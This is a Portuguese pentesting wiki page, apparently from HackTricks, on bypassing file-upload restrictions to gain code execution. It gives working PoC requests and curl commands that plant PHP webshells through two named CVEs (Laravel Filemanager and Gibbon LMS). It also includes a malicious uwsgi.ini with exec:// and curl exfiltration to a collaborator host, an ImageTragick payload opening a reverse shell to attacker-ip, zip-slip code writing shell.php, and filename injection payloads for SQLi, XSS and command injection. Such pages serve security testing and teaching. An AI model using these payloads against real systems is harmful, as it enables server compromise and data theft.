# Upload de Arquivos

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Geral de Upload de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contornar verificações de extensão de arquivo

1. Se aplicável, **verifique** as **extensões anteriores.** Também teste usando algumas **letras maiúsculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionar uma extensão válida antes** da extensão de execução (use as extensões anteriores também):_
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar o Burp para **bruteforcear** todos os caracteres **ascii** e **Unicode**. (_Note que você também pode tentar usar as **extensões** previamente mencionadas_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções **enganando o parser de extensão** do servidor com técnicas como **duplicação** da **extensão** ou **adição de junk** (**null** bytes) entre extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** ao cheque anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão de execução antes da extensão válida** e torça para que o servidor esteja mal configurado. (útil para explorar misconfigurações do Apache onde qualquer coisa com extensão** _**.php**_**, mas** não necessariamente terminando em .php** executará código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** no **Windows**. Neste caso, um caractere de dois-pontos ":" será inserido depois de uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (ex.: "file.asax:.jpg”). Este arquivo pode ser editado depois usando outras técnicas, como usar seu short filename. O padrão "**::$data**” também pode ser usado para criar arquivos não vazios. Portanto, adicionar um ponto depois desse padrão pode ser útil para contornar restrições adicionais (ex.: "file.asp::$data.”)
8. Tente quebrar os limites de nome de arquivo. A extensão válida é cortada. E o PHP malicioso permanece. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alguns handlers de upload removem ou normalizam caracteres de ponto finais do nome de arquivo salvo. No UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) em versões anteriores à 2.9.1, você pode contornar a validação de extensão por:

- Usar um MIME de imagem válido e header mágico correspondente (ex.: o PNG `\x89PNG\r\n\x1a\n`).
- Nomear o arquivo enviado com uma extensão PHP seguida de um ponto, por exemplo, `shell.php.`.
- O servidor remove o ponto final e persiste `shell.php`, que será executado se for colocado em um diretório servido pela web (armazenamento público padrão como `/storage/files/`).

PoC mínimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Em seguida, acesse o caminho salvo (típico em Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigações:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Implemente allowlists estritas no lado do servidor e revalide o nome de arquivo persistido.
- Sirva uploads a partir de locais não executáveis.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Contorne a verificação de **magic number** adicionando no início do arquivo os **bytes de uma imagem real** (confundir o comando _file_). Ou introduza o shell dentro dos **metadados**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou você também pode **inserir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressions is being added to your image**, por exemplo usando algumas bibliotecas padrão do PHP como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as técnicas anteriores não serão úteis. No entanto, você pode usar o **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- A página web também pode estar **redimensionando** a **imagem**, usando por exemplo as funções PHP-GD `imagecopyresized` ou `imagecopyresampled`. Contudo, você pode usar o **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Outra técnica para criar um payload que **sobrevive a um redimensionamento de imagem**, usando a função PHP-GD `thumbnailImage`. No entanto, você pode usar o **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviverá à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Encontre uma vulnerabilidade para **rename** o arquivo já uploaded (para mudar a extensão).
- Encontre uma vulnerabilidade de **Local File Inclusion** para executar o backdoor.
- **Possible Information disclosure**:
1. Upload **diversas vezes** (e ao **mesmo tempo**) o **mesmo arquivo** com o **mesmo nome**
2. Upload um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
3. Upload de um arquivo com **"." , "..", or "…" como nome**. Por exemplo, no Apache em **Windows**, se a aplicação salva os arquivos enviados no diretório "/www/uploads/", o nome de arquivo "." criará um arquivo chamado "uploads" no diretório "/www/".
4. Upload de um arquivo que pode não ser facilmente deletado, tal como **"…:.jpg"** em **NTFS**. (Windows)
5. Upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` no nome. (Windows)
6. Upload de um arquivo no **Windows** usando nomes **reservados** (**proibidos**) tais como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Tente também **fazer upload de um executável** (.exe) ou um **.html** (menos suspeito) que **executará código** quando aberto acidentalmente pela vítima.

### Special extension tricks

Se você estiver tentando enviar arquivos para um **PHP server**, [dê uma olhada no truque do **.htaccess** para executar código](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se você estiver tentando enviar arquivos para um **ASP server**, [dê uma olhada no truque do **.config** para executar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os `.jar` para java, mas para php, e podem ser **usados como um arquivo php** (executando-o com php, ou incluindo-o dentro de um script...)

A extensão `.inc` é às vezes usada para arquivos php que são apenas usados para **importar arquivos**, então, em algum ponto, alguém poderia ter permitido **que essa extensão fosse executada**.

## **Jetty RCE**

Se você conseguir enviar um arquivo XML para um servidor Jetty você pode obter [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Portanto, como mencionado na imagem a seguir, envie o arquivo XML para `$JETTY_BASE/webapps/` e espere o shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Fornecendo uma exploração detalhada desta vulnerabilidade, consulte a pesquisa original: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Remote Command Execution (RCE) podem ser exploradas em servidores uWSGI se alguém tiver a capacidade de modificar o arquivo de configuração `.ini`. Os arquivos de configuração uWSGI utilizam uma sintaxe específica para incorporar variáveis "mágicas", placeholders e operadores. Notavelmente, o operador '@', utilizado como `@(filename)`, é projetado para incluir o conteúdo de um arquivo. Entre os vários schemes suportados no uWSGI, o scheme "exec" é particularmente potente, permitindo a leitura de dados a partir do stdout de um processo. Essa funcionalidade pode ser manipulada para fins nefastos como Remote Command Execution ou Arbitrary File Write/Read quando um arquivo `.ini` é processado.

Considere o seguinte exemplo de um `uwsgi.ini` malicioso, demonstrando vários schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante o parsing do arquivo de configuração. Para que a configuração seja ativada e parseada, o processo uWSGI deve ser reiniciado (potencialmente após um crash ou devido a um ataque de Denial of Service) ou o arquivo deve ser configurado para auto-reload. A funcionalidade auto-reload, se habilitada, recarrega o arquivo em intervalos especificados ao detectar mudanças.

É crucial entender a natureza permissiva do parsing do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (como uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

### Gibbon LMS escrita arbitrária de arquivo para RCE pré-auth (CVE-2023-45878)

Um endpoint não autenticado no Gibbon LMS permite escrita arbitrária de arquivos dentro do web root, levando a RCE pré-auth ao enviar um arquivo PHP. Versões vulneráveis: até e incluindo 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (o servidor ignora type/name e decodifica em base64 a parte final)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC mínimo para escrever e ler de volta um arquivo:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Enviar um webshell mínimo e executar comandos:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notas:
- O handler executa `base64_decode($_POST["img"])` após dividir por `;` e `,`, então grava os bytes em `$absolutePath . '/' . $_POST['path']` sem validar extensão/tipo.
- O código resultante é executado como o usuário do serviço web (por exemplo, XAMPP Apache on Windows).

Referências para este bug incluem o advisory do usd HeroLab e a entrada NVD. Veja a seção Referências abaixo.

## **wget File Upload/SSRF Trick**

Em algumas ocasiões você pode descobrir que um servidor está usando **`wget`** para **download files** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando que a extensão dos arquivos baixados está em uma whitelist para assegurar que apenas arquivos permitidos serão baixados. Contudo, **this check can be bypassed.**\
O **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Observe que **outra opção** que você pode estar pensando para contornar essa checagem é fazer com que o **servidor HTTP redirecione para um arquivo diferente**, de modo que a URL inicial passará pela verificação e então o wget baixará o arquivo redirecionado com o novo nome. Isso **não vai funcionar** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names` porque **wget irá baixar a página redirecionada com o nome do arquivo indicado na URL original**.

## Ferramentas

- [Upload Bypass] é uma ferramenta poderosa projetada para auxiliar Pentesters e Bug Hunters no teste de mecanismos de file upload. Ela aproveita várias técnicas de bug bounty para simplificar o processo de identificação e exploração de vulnerabilidades, garantindo avaliações completas de aplicações web.

### Corrompendo índices de upload com peculiaridades do snprintf (histórico)

Alguns legacy upload handlers que usam `snprintf()` ou similares para construir arrays multi-file a partir de um single-file upload podem ser enganados a forjar a estrutura `_FILES`. Devido a inconsistências e truncamento no comportamento de `snprintf()`, um upload único cuidadosamente criado pode aparecer como múltiplos arquivos indexados no lado do servidor, confundindo lógica que assume uma forma estrita (por exemplo, tratando como um multi-file upload e seguindo ramificações inseguras). Embora seja nicho hoje em dia, esse padrão de “index corruption” ocasionalmente ressurgem em CTFs e em bases de código mais antigas.

## From File upload to other vulnerabilities

- Defina **filename** para `../../../tmp/lol.png` e tente conseguir um **path traversal**
- Defina **filename** para `sleep(10)-- -.jpg` e você pode conseguir um **SQL injection**
- Defina **filename** para `<svg onload=alert(document.domain)>` para conseguir um **XSS**
- Defina **filename** para `; sleep 10;` para testar alguma **command injection** (mais [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Tente **diferentes svg payloads** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se você pode **indicar ao web server para buscar uma imagem a partir de uma URL** você pode tentar abusar um [SSRF](../ssrf-server-side-request-forgery/index.html). Se essa **image** for **salva** em algum site **público**, você também poderia indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informação de cada visitante**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDFs especialmente craftados para XSS: A [página a seguir apresenta como **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Se você puder fazer upload de PDFs, poderia preparar um PDF que execute JS arbitrário seguindo as indicações dadas.
- Faça upload do \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar se o servidor possui algum **antivírus**
- Verifique se existe algum **limite de tamanho** ao fazer upload de arquivos

Aqui vai uma lista top 10 de coisas que você pode alcançar fazendo upload (a partir de [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Extensão Burp


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes mágicos de cabeçalho

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para outros tipos de arquivo.

## Upload de arquivos Zip/Tar descomprimidos automaticamente

Se você puder fazer upload de um ZIP que será descomprimido dentro do servidor, você pode fazer 2 coisas:

### Symlink

Faça upload de um pacote contendo links simbólicos para outros arquivos; então, ao acessar os arquivos descomprimidos, você acessará os arquivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompactar em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompactação é um problema significativo. Apesar das suposições iniciais de que essa configuração poderia impedir a execução de comandos em nível OS-level por meio de uploads maliciosos, o suporte a compressão hierárquica e as capacidades de directory traversal do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes contornem restrições e escapem dos diretórios de upload seguros manipulando a funcionalidade de descompactação da aplicação alvo.

Um exploit automatizado para gerar esses arquivos está disponível em [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). O utilitário pode ser usado como mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, o **symlink trick with evilarc** é uma opção. Se o objetivo for atingir um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado no seu sistema. Isso garante que evilarc não encontre erros durante sua operação.

Abaixo está um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusando de compressão para file spraying**

Para mais detalhes **veja a postagem original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Código PHP é escrito para executar comandos passados através da variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vários arquivos são criados e um arquivo zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um hex editor, trocando "xxA" por "../" para percorrer diretórios.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Faça upload deste conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (do [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando PHP Shell em PNG

Incorporar um PHP shell no IDAT chunk de um arquivo PNG pode efetivamente contornar certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes neste contexto, pois são comumente usadas para redimensionar e resamplear imagens, respetivamente. A capacidade do PHP shell incorporado de permanecer inalterado por essas operações é uma vantagem significativa para certos casos de uso.

A exploração detalhada desta técnica, incluindo sua metodologia e possíveis aplicações, é apresentada no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreensão abrangente do processo e suas implicações.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Arquivos polyglot

Arquivos polyglot funcionam como camaleões que podem existir de forma válida em múltiplos formatos de arquivo simultaneamente. Um exemplo intrigante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como GIF quanto como um arquivo RAR. Esses arquivos não se limitam a essa combinação; combinações como GIF e JS ou PPT e JS também são viáveis.

A utilidade principal dos arquivos polyglot reside na sua capacidade de contornar medidas de segurança que filtram arquivos com base no tipo. A prática comum em várias aplicações é permitir apenas certos tipos de arquivo para upload — como JPEG, GIF, ou DOC — para mitigar o risco representado por formatos potencialmente perigosos (ex.: JS, PHP, ou Phar). No entanto, um polyglot, ao conformar-se aos critérios estruturais de múltiplos tipos, pode contornar essas restrições de forma furtiva.

Apesar da adaptabilidade, polyglots enfrentam limitações. Por exemplo, embora um polyglot possa ao mesmo tempo incorporar um PHAR e um JPEG, o sucesso do upload pode depender da política de extensões do sistema. Se o sistema for rígido quanto às extensões permitidas, a mera dualidade estrutural de um polyglot pode não ser suficiente para garantir o upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Como evitar detecções de tipo de arquivo fazendo upload de um arquivo JSON válido mesmo quando não permitido, falsificando um PDF (técnicas do **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Contanto que os bytes mágicos `%PDF` estejam nos primeiros 1024 bytes, é válido (veja exemplo no post)
- **`pdflib` library**: Adicione um formato PDF falso dentro de um campo do JSON para que a biblioteca pense que é um PDF (veja exemplo no post)
- **`file` binary**: Ele pode ler até 1048576 bytes de um arquivo. Basta criar um JSON maior que isso para que ele não consiga parsear o conteúdo como JSON e então, dentro do JSON, colocar a parte inicial de um PDF real e ele vai identificar como PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
